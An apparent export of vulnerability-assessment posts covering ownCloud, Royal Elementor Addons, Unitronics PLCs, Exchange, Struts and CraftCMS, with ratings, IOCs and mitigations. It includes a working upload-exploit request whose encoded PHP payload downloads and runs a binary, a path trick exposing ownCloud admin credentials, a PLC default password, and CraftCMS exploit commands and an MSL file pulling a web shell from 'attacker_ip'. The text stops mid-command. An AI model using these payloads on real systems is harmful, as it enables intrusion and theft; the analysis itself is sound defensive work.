      "document": "_Update Dec 1, 2023: I have updated this assessment to reflect that vulnerable Docker based installations are indeed exploitable with a trivial modification of the original exploit technique. I have adjusted the exploitability rating and attacker value rating to reflect this new information. I also clarified that the addition of phpinfo to the PHP disabled functions list is a recent addition by ownCloud in response to the vulnerability, and it has been back ported to older Docker images._\r\n\r\n## Overview\r\nSome installations of ownCloud may contain a vulnerable [graphapi](https://marketplace.owncloud.com/apps/graphapi) application which exposes a PHP endpoint `/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php` that allows the output of the `phpinfo()` function to be displayed to an attacker. This output may contain sensitive information, such as secrets held in environment variables. How the target endpoint is successfully reached depends on how the ownCloud installation was performed.\r\n\r\nownCloud may be installed via one of two methods as described in the [vendor documentation](https://doc.owncloud.com/server/next/admin_manual/installation/), either via Docker or via a manual installation. How ownCloud was installed will impact its vulnerability.\r\n\r\n## Installation via Docker\r\nWhen a vulnerable ownCloud Docker image is run as a Docker container, a vulnerable `graphapi` application will be present by default (we tested ownCloud 10.13.0 and 10.12.1), however any attempt to reach the vulnerable endpoint will result in a 302 redirect to the login page. This does not happen against a manual installation of a vulnerable ownCloud, as the Docker image contains some additional entries in the file `/var/www/owncloud/.htaccess` which redirect all requests that don\u2019t match some rewrite rules, to a dispatcher via `index.php`, which in turn was observed to perform the 302 redirect.\r\n\r\n```\r\nErrorDocument 403 /core/templates/403.php\r\nErrorDocument 404 /core/templates/404.php\r\n<IfModule mod_rewrite.c>\r\n Options -MultiViews\r\n RewriteRule ^favicon.ico$ core/img/favicon.ico [L]\r\n RewriteRule ^core/js/oc.js$ index.php [PT,E=PATH_INFO:$1]\r\n RewriteRule ^core/preview.png$ index.php [PT,E=PATH_INFO:$1]\r\n RewriteCond %{REQUEST_URI} !\\.(css|js|svg|gif|png|html|ttf|woff|ico|jpg|jpeg|json|properties)$\r\n RewriteCond %{REQUEST_URI} !\\.(min|js|auto)\\.map$\r\n RewriteCond %{REQUEST_URI} !^/core/img/favicon\\.ico$\r\n RewriteCond %{REQUEST_URI} !^/robots\\.txt$\r\n RewriteCond %{REQUEST_URI} !^/remote\\.php\r\n RewriteCond %{REQUEST_URI} !^/public\\.php\r\n RewriteCond %{REQUEST_URI} !^/cron\\.php\r\n RewriteCond %{REQUEST_URI} !^/core/ajax/update\\.php\r\n RewriteCond %{REQUEST_URI} !^/status\\.php$\r\n RewriteCond %{REQUEST_URI} !^/ocs/v1\\.php\r\n RewriteCond %{REQUEST_URI} !^/ocs/v2\\.php\r\n RewriteCond %{REQUEST_URI} !^/updater/\r\n RewriteCond %{REQUEST_URI} !^/ocs-provider/\r\n RewriteCond %{REQUEST_URI} !^/ocm-provider/\r\n RewriteCond %{REQUEST_URI} !^/\\.well-known/(acme-challenge|pki-validation)/.*\r\n RewriteRule . index.php [PT,E=PATH_INFO:$1]\r\n RewriteBase /\r\n <IfModule mod_env.c>\r\n   SetEnv front_controller_active true\r\n   <IfModule mod_dir.c>\r\n     DirectorySlash off\r\n   </IfModule>\r\n </IfModule>\r\n</IfModule>\r\n```\r\n\r\nWhile it was initially believed that avoiding the Apache rewrite rule that generated a 302 response was not possible, it has now been discovered that a simple modification to the target URI path can bypass the rewrite rule and successfully reach the target endpoint. We can see above that several file extensions have a rewrite condition that will avoid the rewrite rule if they are passed. Specifically paths that end in `.css` or `.js` (and so on) will not be subject to the rewrite condition. In order to successfully call the target PHP page, while also ending a URI path with a file extension that is not `.php`, we can append a forward slash followed by the file extension that will bypass the rewrite condition. For example appending `/.css` to the target URI will allow the `GetPhpInfo.php` page to be called while still ending the URI in a file extension that bypasses the rewrite condition.\r\n\r\nThis will reveal the `OWNCLOUD_ADMIN_USERNAME` and `OWNCLOUD_ADMIN_PASSWORD`, allowing an attacker to login to the ownCloud system as an Administrator user, as shown below:\r\n\r\n\r\n![ownCloud_hax2.png](https://raw.githubusercontent.com/sfewer-r7/akb_assets/main/CVE-2023-49103/ownCloud_hax2.png)\r\n\r\n## Mitigating with PHP disabled functions\r\nIt appears ownCloud has been updating older Docker images (we tested 10.13.0 and 10.12.2) to add the PHP function `phpinfo` to the `disable_functions` list. If this is in place, even if you can reach the vulnerable endpoint, you would get no content returned.\r\n\r\n```\r\nroot@b14ad59db823:/var/www/owncloud# cat /etc/php/7.4/apache2/conf.d/99-owncloud-apache.ini \r\n= pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,\r\npcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,\r\npcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,system,phpinfo,show_source,fopen_with_path,\r\ndbmopen,dbase_open,filepro_retrieve,posix_mkfifo\r\nroot@b14ad59db823:/var/www/owncloud#\r\n```\r\n\r\nNotably, we also inspected an older Docker image for version 10.10.0 and 10.12.1, and found that these versions do not contain \u2018phpinfo\u2019 in the `disable_functions` list. \r\n\r\nFor this mitigation to be effective, the running Docker container would have to use a Docker image that has been recently updated to include this mitigation. So containers based on images that did not have this mitigation applied at the time the image was downloaded, will not have the mitigation in place.\r\n\r\n## Manual Installation\r\nWhen manually installing ownCloud (we tested 10.13.0 for the manual installation), the `graphapi` application is not installed by default (unlike the Docker counterpart). You must manually download and install the vulnerable component. After this is done, it is possible to reach the vulnerable endpoint via a simple GET request, resulting in the display of the apache2 processes environment variables.\r\n\r\n![Screenshot%202023-11-29%20141835.png](https://raw.githubusercontent.com/sfewer-r7/akb_assets/main/CVE-2023-49103/Screenshot%202023-11-29%20141835.png)\r\n\r\n## Exploitability\r\nIt seems more likely that sensitive environment variables would be present in a Docker based installation of ownCloud, as this is a common technique used to pass secrets to a Docker container at runtime. In addition, Docker based ownCloud images include the vulnerable `graphapi` component by default. While the original public exploit did not work against Docker based installations, we now know it is possible to exploit a Docker based installation. This new development significantly increases both the attacker value and exploitability of this vulnerability.\r\n\r\n## Misc\r\nIt is also worth pointing out that the public PoC uses the endpoint `/owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php`. Note the `/owncloud/` path segment at the start of the URI. If ownCloud has been installed either via Docker, or manually as per the official instructions, this path segment is not expected to be present. The expected URI should be `/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php`. Researcher [Will Dormann](https://twitter.com/wdormann/status/1729722059612209477) has noted this anomaly also.\r\n",
      "score": 4,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "015f8589-827f-46b7-939a-172aa1aa9d56",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "32a22264-c160-4bac-a73e-a6bb5a2a5a55",
      "created": "2023-11-29T21:40:53.884336Z",
      "revisionDate": "2023-12-07T14:17:56.258133Z",
      "document": "The Royal Elementor Addons and Templates WordPress plugin provides themes and templates to make your WordPress site aesthetically pleasing with little effort. With over [200,000 installations](https://wordpress.org/plugins/royal-elementor-addons/) it is quite popular making it a fantastic target for opportunistic attackers. \r\n\r\nVersions prior to 1.3.79 are vulnerable to a file upload vulnerability which results in code execution as the user running the WordPress site. Once a WordPress site is configured to use the Addon the following action `wpr_addons_upload_file` listens for input on the `/wp-admin/admin-ajax.php` endpoint and is envokeable via a POST request. The action is accessible without authentication and fails to properly sanitize incoming file types. The endpoint won\u2019t allow you to upload the `.php` file type however if you upload a PHP payload with the filetype `.ph$p` it bypasses the sanitization mechanism and allows you to drop a payload on the target. \r\n\r\nExploitation of the vulnerability is demonstrated in the following POST request:\r\n```\r\nPOST /wp-admin/admin-ajax.php HTTP/1.1\r\nHost: wordpress.docksal\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15\r\nContent-Type: multipart/form-data; boundary=---------------------------612499444778935602855148342223\r\nContent-Length: 1078\r\n\r\n-----------------------------612499444778935602855148342223\r\nContent-Disposition: form-data; name=\"uploaded_file\"; filename=\"WmrRA8wI.ph$p\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system(base64_decode('Y3VybCAtc28gLi92RVNIVllzd0p2dyBodHRwOi8vMTcyLjE2LjE5OS4xMzc6ODA4MC9rQW9vd3NKYnpVRER3X2FDbFg4RDhnOyBjaG1vZCAreCAuL3ZFU0hWWXN3SnZ3OyAuL3ZFU0hWWXN3SnZ3ICY='));?>\r\n-----------------------------612499444778935602855148342223\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nwpr_addons_upload_file\r\n-----------------------------612499444778935602855148342223\r\nContent-Disposition: form-data; name=\"max_file_size\"\r\n\r\n6395\r\n-----------------------------612499444778935602855148342223\r\nContent-Disposition: form-data; name=\"allowed_file_types\"\r\n\r\nph$p\r\n-----------------------------612499444778935602855148342223\r\nContent-Disposition: form-data; name=\"triggering_event\"\r\n\r\nclick\r\n-----------------------------612499444778935602855148342223\r\nContent-Disposition: form-data; name=\"wpr_addons_nonce\"\r\n\r\naa1b436f01\r\n-----------------------------612499444778935602855148342223--\r\n```\r\n\r\nThis has been actively exploited in the wild for a while now with the first signs of exploitation dating back to [December 2019](https://www.wordfence.com/blog/2023/10/psa-critical-unauthenticated-arbitrary-file-upload-vulnerability-in-royal-elementor-addons-and-templates-being-actively-exploited/). \r\n\r\n## IOCs\r\n\r\nMalicious adversaries have been identified dropping reverse shells in the following two filenames:\r\n\r\n\r\n`b1ack.p$hp` with md5sum: `1635f34d9c1da30ff5438e06d3ea6590`\r\n`wp.ph$p` with md5sum: `\u200b\u200bbac83f216eba23a865c591dbea427f22`\r\n\r\nThat being said, I would be suspicious of any `.ph$p` file if the Royal Elementor Addons and Template plugin was being used in my WordPress site. \r\n\r\n*Note: Updating the plugin to the patched version `1.3.79` won\u2019t remove malicious payloads dropped by an attacker - so be sure to scan for unwanted footholds after patching. \r\n\r\n\r\nThe majority of the attacks appear to be coming from the following three IP Addresses:\r\n\r\n65[.]21.22.78 \r\n2a01[:]4f9:3080:4eea::2 \r\n135[.]181.181.50 \r\n\r\n\r\n## Attacker Value and Exploitation \r\n\r\n - This is super easy to exploit.\r\n - It\u2019s an unauth RCE in an internet facing application with +200,000 active installations (it\u2019s a big deal)\r\n - Exploited in the wild\r\n - The only reason I\u2019d give it a 4/5 for Attack Value is because it doesn\u2019t give privileged access. \r\n\r\n\r\n",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a36fc4de-cab6-44cb-832c-da6b26a6fa27",
      "editorId": "394f93fa-469a-42c0-a05e-669126f209c3",
      "topicId": "37b73f68-3690-424c-bef8-dbad2240c736",
      "created": "2023-12-11T05:36:21.583053Z",
      "revisionDate": "2023-12-11T05:36:21.582293Z",
      "document": "",
      "score": 1,
      "metadata": {
        "attacker-value": 4
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        }
      ]
    },
    {
      "id": "f728e029-837a-4460-9570-b4d540e59425",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "bceab8c2-e26c-4783-aad9-af9ae883be57",
      "created": "2023-12-13T10:51:02.695927Z",
      "revisionDate": "2023-12-13T10:51:02.695913Z",
      "document": "The Cybersecurity and Infrastructure Security Agency (CISA) is actively addressing a situation involving the unauthorized use of Unitronics programmable logic controllers (PLCs), specifically in the Water and Wastewater Systems (WWS) Sector. These PLCs, vital for water treatment processes, have been compromised by cyber attackers, particularly targeting a specific Unitronics PLC at a water facility in the United States. In reaction, the local water authority responsible for the facility promptly disconnected the compromised system from their network and reverted to manual operations. Fortunately, there is no immediate threat to the community's drinking water or overall water supply.\r\n\r\nUnauthorized access and efforts to breach the security of WWS systems pose a significant risk. Such actions can disrupt the provision of clean drinking water and the efficient treatment of wastewater in affected communities.\r\n\r\nThe cybercriminals in this instance seemingly gained access to the targeted device, a Unitronics Vision Series PLC equipped with a Human Machine Interface (HMI), by exploiting cybersecurity vulnerabilities. These vulnerabilities include inadequate password security measures and the PLC's exposure to the internet.\r\n\r\nBy default the Unitronics PLC default password = \"1111\"",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "e1c6305b-67cb-405c-8d76-26f1247c3c63",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "a7f7deaa-205f-44a8-aa0a-10cf47185f0b",
      "created": "2023-12-14T14:58:24.871666Z",
      "revisionDate": "2023-12-15T11:47:07.246249Z",
      "document": "I've marked this as difficult to exploit due to the number of conditions that must be met for an attacker to successfully leverage it.\r\nExploiting this vulnerability is not straightforward; there are multiple security restrictions in place to prevent exploitation.\r\n\r\n1. The attacker needs the credentials of a valid user.\r\n2. The attacker needs to be on the local area network.\r\n    \r\n    More specifically, the user needs to have access to the Domain Controller / KDC to authenticate to the Exchange service with Kerberos (tcp/88).\r\n    \r\n3. `[loadFromRemoteSources](https://learn.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/dd409252(v=vs.100))` needs to be enabled in the Exchange server\u2019s .NET application configuration.\r\n    \r\n    This is a discrepancy between what I have observed and what is stated in the public analysis. The translated statement \u201c\u4f46\u662f\u597d\u5728\u8fd8\u53ef\u4ee5\u901a\u8fc7SMB\u5171\u4eab\u52a0\u8f7d\u5176\u4ed6\u673a\u5668\u4e0a\u7684\u7a0b\u5e8f\u96c6\u3002\" (translation: \u201cBut fortunately, you can also load assemblies on other machines through SMB sharing.\u201d) appears to be false. When using .NET Framework 4, Exchange Server 2019 CU12 is unable to load the `FUSE.Paxos.dll` library from an SMB server as specified by a UNC path. In the default settings, the server even raises a `System.IO.FileLoadException` exception when the path is local (e.g. `C:\\Shares` ). Exchange Server 2019 requires .NET Framework version 4.8 to be installed, so there will not be any instances where an older version is in use that does not implement the `loadFromRemoteSources` setting.\r\n    \r\n    Furthermore, according to [More Implicit Uses of CAS Policy: loadFromRemoteSources](https://learn.microsoft.com/en-us/archive/blogs/shawnfa/more-implicit-uses-of-cas-policy-loadfromremotesources) which states:\r\n    \r\n    > For example, in .NET 3.5 the following code:\r\n    > \r\n    > \r\n    > ```csharp\r\n    > Assembly internetAssembly = Assembly.LoadFrom(@\"https://www.microsoft.com/assembly.dll\");\r\n    > Assembly intranetAssembly = Assembly.LoadFrom(@\"\\\\server\\share\\assembly.dll\");\r\n    > ```\r\n    > \r\n    > Will by default load internetAssembly with the Internet permission set and intranetAssembly with the LocalIntranet permission set.\u00a0\u00a0 That was because the CLR would internally gather evidence for both assemblies and run that evidence though CAS policy in order to find the permission set to grant that assembly.\r\n    > \r\n    > Now that\u00a0[the sandboxing model has changed in the v4 CLR](https://learn.microsoft.com/en-us/archive/blogs/shawnfa/sandboxing-in-net-4-0), there is no more CAS policy to apply the assembly\u2019s evidence to by default, and\u00a0 therefore default behavior of both of these loads would be to load the assemblies with a grant set of full trust.\r\n    > \r\n    \r\n    A UNC path would have the LocalIntranet permission set by the CLR and the CAS policy in .NET 3.5. In version 4.0 though, it is prevented from loading without enabling `loadFromRemoteSources` because it would receive a grant set of full trust. This is aligned with the observed behavior.\r\n    \r\n4. A crafted `FUSE.Paxos.dll` file must be placed in a location accessible from the target Exchange Server.\r\n    \r\n    Realistically, this will probably be on a network share that the attacker can write to that the Exchange Server can authenticate to and read from. Using default settings, the attacker can not host it on their own SMB server because [Windows blocks shared folder access as unauthenticated guests.](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/guest-access-in-smb2-is-disabled-by-default)\r\n\r\nIf all of the necessary conditions are met, the vulnerability can be exploited reliably. The result is code execution in the context of NT AUTHORITY/SYSTEM as a new process is created. Starting a new process could be avoided by modifying the source of `FUSE.Paxos.dll`.",
      "score": 2,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "f3d2f8fe-aa83-48e4-b3bf-f2f11af61e9c",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "fc6a2171-de79-425d-b682-6d95d0f8e42d",
      "created": "2023-12-15T18:19:51.824166Z",
      "revisionDate": "2023-12-15T18:46:26.196936Z",
      "document": "Based on our [Rapid7 Analysis](https://attackerkb.com/topics/pe3CCtOE81/cve-2023-50164/rapid7-analysis), the attacker value of this vulnerability is High, as successful exploitation can result in remote code execution via arbitrary file uploads, such as uploading a web shell or similar. However I have rated the exploitability as Low as there are a number or prerequisites that must be met for a Struts based web application to be vulnerable. Currently we don't have any concrete examples of production applications that are vulnerable to CVE-2023-50164. This may change as the vulnerability comes under more scrutiny and more Struts based applications are examined.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "c4eef41a-bcab-44d3-9154-922a7d699370",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "fc6a2171-de79-425d-b682-6d95d0f8e42d",
      "created": "2023-12-15T18:46:21.015192Z",
      "revisionDate": "2023-12-15T20:00:45.662004Z",
      "document": "Despite the buzz on this one, so far we haven't been able to identify any real-world applications that are vulnerable and exploitable out of the box, though that doesn't mean they don't exist. \r\n\r\nPer @sfewer-r7's [analysis of the bug](https://attackerkb.com/topics/pe3CCtOE81/cve-2023-50164/rapid7-analysis), this is not trivially exploitable, and exploits may need to be target-specific if there are any real applications discovered to be vulnerable in common configurations. At least three [different](https://www.trendmicro.com/en_us/research/23/l/decoding-cve-2023-50164--unveiling-the-apache-struts-file-upload.html) [security](https://twitter.com/akamai_research/status/1735049812746137929) [firms](https://twitter.com/Shadowserver/status/1734919288257974380) are reporting exploitation in the wild, but it's not clear that any of them have seen actual exploitable code paths get hit, or that the attack vectors are production applications rather than demo applications configured to be artificially exploitable (which is what the public PoCs currently target). Happy to be wrong if we're wrong, but until then, \"don't panic\" sounds like the order of the day. If there are follow-on vendor advisories patching this out of their specific product implementations, it'd probably be good to pay attention to those as they roll in.\r\n\r\nEdit: Shadowserver actually [said explicitly](https://twitter.com/Shadowserver/status/1734992405357580522) that none of the attempts they'd seen as of December 13 had been successful. ",
      "score": 2,
      "metadata": {
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "80fbfcd6-7447-4b85-8fd8-05deb060d9d0",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "395c0590-27b9-4843-9c01-5e38ef804d83",
      "created": "2023-12-16T15:35:44.408531Z",
      "revisionDate": "2023-12-19T09:27:42.065154Z",
      "document": "`CraftCMS` is a popular content management system that is widely used and available on the Internet. Unfortunately  `CraftCMS` versions between `4.0.0-RC1` - `4.4.14` are exposed by a vulnerability allowing attackers to execute arbitrary code remotely, potentially compromising the security and integrity of the application.\r\n\r\nThe vulnerability occurs using a PHP object creation in the `\\craft\\controllers\\ConditionsController` class which allows to run arbitrary PHP code by escalating the object creation calling some methods available in `\\GuzzleHttp\\Psr7\\FnStream`. Using this vulnerability in combination with `The Imagick Extension` and `MSL` which stands for `Magick Scripting Language`, a full RCE can be achieved. `MSL` is a built-in `ImageMagick` language that facilitates the reading of images, performance of image processing tasks, and writing of results back to the filesystem. This can be leveraged to create a dummy image containing malicious PHP code using the `Imagick` constructor class delivering a webshell that can be accessed by the attacker, thereby executing the malicious PHP code and gaining access to the system.\r\n\r\nWell, this is quite a mouth full, so let's take it step by step...\r\n\r\nLet's first touch the part of `PHP Object Creation` which is the core of the issue. In this [article from ptswarm](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) written by `Arseniy Sharoglazov` the concept of  `PHP\u2019s Arbitrary Object Instantiation` is very well explained that is a flaw in which an attacker can create arbitrary objects. This flaw can come in all shapes and sizes.\r\n\r\nWithin CraftCMS versions `4.4.14` and below, this flaw can also be leveraged to run arbitrary code on a vulnerable instance.\r\nIn this [blog](https://blog.calif.io/p/craftcms-rce) published by `Thanh` on September 14,  the security researchers discovered a PHP object instantiation flaw that resides in the `\\craft\\controllers\\ConditionsController` class. The `beforeAction` method was identified and provided the ability to create an arbitrary object.\r\nSo far, so good, but you will need to find gadgets that can be used to escalate the object creation into something meaningful, like methods that allow to run code. One of these methods was found in the `\\GuzzleHttp\\Psr7\\FnStream` class.\r\n```\r\npublic function __destruct()\r\n{\r\n   if (isset($this->_fn_close)) {\r\n       call_user_func($this->_fn_close);\r\n   }\r\n}\r\n```\r\nwith the `curl` command below, you can trigger this flaw calling the method and executing the `phpinfo` command.\r\n```\r\ncurl -sk \"https://craftcms-vuln.ddev.site\" -x localhost:8080 -X POST -d 'action=conditions/render&configObject[class]=craft\\elements\\conditions\\ElementCondition&config={\"name\":\"configObject\",\"as \":{\"class\":\"\\\\GuzzleHttp\\\\Psr7\\\\FnStream\", \"__construct()\":{\"methods\":{\"close\":\"phpinfo\"}}}}'\r\n```\r\nCapturing the response with `burpsuite` shows that the `phpinfo` is executed.\r\n\r\n**Burp response**\r\n```html\r\nHTTP/2 500 Internal Server Error\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Sun, 17 Dec 2023 17:17:41 GMT\r\nServer: nginx\r\nX-Powered-By: Craft CMS\r\nX-Robots-Tag: none\r\n\r\n    <!doctype html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"utf-8\"/>\r\n\r\n    <title>Invalid Configuration \u2013 yii\\base\\InvalidConfigException</title>\r\n\r\n--- SNIP REMOVED CONTENT ---\r\n\r\n<h1 class=\"p\">PHP Version 8.1.26</h1>\r\n</td></tr>\r\n</table>\r\n<table>\r\n<tr><td class=\"e\">\r\n     System\r\n    </td>\r\n    <td class=\"v\">\r\n       Linux craftcms-vuln-web 6.4.16-linuxkit #1 SMP PREEMPT_DYNAMIC Thu Nov 16 10:55:59 UTC 2023 x86_64 \r\n     </td>\r\n</tr>\r\n<tr><td class=\"e\">\r\n    Build Date \r\n  </td>\r\n  <td class=\"v\">\r\n    Nov 24 2023 13:12:14 \r\n  </td>\r\n</tr>\r\n<tr><td class=\"e\">\r\n    Build System \r\n  </td>\r\n<td class=\"v\">\r\n    Linux \r\n  </td>\r\n</tr>\r\n<tr><td class=\"e\">\r\n    Server API \r\n  </td>\r\n<td class=\"v\">\r\n   FPM/FastCGI \r\n   </td>\r\n</tr>\r\n--- ETC ETC ---\r\n```\r\nThis is pretty cool, but it is quite limited what you can execute. \r\nFor instance, PHP `system()` calls with arguments do not work as well as inline PHP code. We have to find other gadgets that can deliver a full RCE using this flaw.\r\n\r\nLet's go back to the [article](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) written by `Arseniy Sharoglazov`. In the last section of his article, he explains `the Imagick Extension` and more specific to use this extension in combination with the `Magick Scripting Language (MSL)` to trigger a full RCE using PHP object instantiation (see section Imagick Extension and RCE #2: VID Scheme).\r\n\r\nAnd surprise, surprise, CraftCMS is using this `Imagick Extension` which allows us to build a full RCE.\r\n\r\nUsing the `Imagick` constructor class in combination with `MSL` and a `VID` schema allows you to read and write images. This can be used to build an out of band RCE reading an image file with PHP code from the attacker controlled host and write it back to the `CraftCMS` host for execution.\r\n\r\n**Step 1:**\r\nCreate an `MSL` file (`pawn.msl`) that downloads a vulnerable payload from the attacker host and writes it to `CraftCMS` instance.\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<image>\r\n <read filename=\"http://attacker_ip:8000/vuln.png\" />\r\n <write filename=\"/var/www/html/web/shell.php\" />\r\n</image>\r\n```\r\n**Step 2:**\r\nCreate the `vuln.png` by adding PHP code to a small PNG image and host it on the attacker machine\r\n```shell\r\nexiftool -comment=\"<?php phpinfo(); ?>\" vuln.png\r\npython3 -m http.server 8000\r\n```\r\n**Step 3:**\r\nCall the `Imagick` constructor class to upload the `MSL` file.\r\nThis typically creates a `MSL` file with a random filename starting with `php<random chars>` in the `/tmp` directory on the `CraftCMS` instance.\r\n```shell\r\ncurl -sk \"https://craftcms-vuln.ddev.site\" 